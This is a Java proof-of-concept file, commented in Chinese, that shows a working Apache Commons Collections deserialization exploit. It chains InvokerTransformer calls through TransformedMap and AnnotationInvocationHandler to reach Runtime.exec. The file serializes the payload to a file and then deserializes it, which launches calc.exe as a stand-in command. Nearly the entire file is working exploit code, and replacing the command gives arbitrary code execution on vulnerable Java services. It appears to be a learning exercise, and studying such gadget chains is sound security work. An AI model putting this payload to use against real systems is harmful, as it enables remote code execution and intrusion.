package fanxulie;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
	public class fanxulie6{
		public static void main(String[] args) throws Exception {
			//1.客户端构建攻击代码
			//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
			Transformer[] transformers = new Transformer[] {
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
					new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
					new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
			};
			//将transformers数组存入ChaniedTransformer这个继承类
			Transformer transformerChain = new ChainedTransformer(transformers);

			//创建Map并绑定transformerChina
			Map innerMap = new HashMap();
			innerMap.put("value", "value");
			//给予map数据转化链
			Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
			//反射机制调用AnnotationInvocationHandler类的构造函数
			Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
			Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
			//取消构造函数修饰符限制
			ctor.setAccessible(true);
			//获取AnnotationInvocationHandler类实例
			Object instance = ctor.newInstance(Target.class, outerMap);

			//payload序列化写入文件，模拟网络传输
			FileOutputStream f = new FileOutputStream("payload.bin");
			ObjectOutputStream fout = new ObjectOutputStream(f);
			fout.writeObject(instance);

			//2.服务端读取文件，反序列化，模拟网络传输
			FileInputStream fi = new FileInputStream("payload.bin");
			ObjectInputStream fin = new ObjectInputStream(fi);
			//服务端反序列化
			fin.readObject();
		}


	}
	
	/*
	思路:构建BeforeTransformerMap的键值对，为其赋值，
	     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
	     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行

	     执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
	     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()

	*/